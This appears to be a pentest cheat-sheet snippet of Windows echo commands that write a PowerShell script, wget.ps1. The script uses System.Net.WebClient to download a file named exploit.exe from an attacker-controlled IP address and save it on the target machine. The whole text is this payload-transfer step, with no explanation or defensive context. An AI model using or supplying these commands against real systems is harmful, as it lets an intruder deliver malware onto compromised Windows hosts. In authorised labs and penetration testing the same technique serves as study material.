echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = "http://192.168.12.132/exploit.exe" >> wget.ps1
echo $file = "new-exploit.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >> wget.ps1
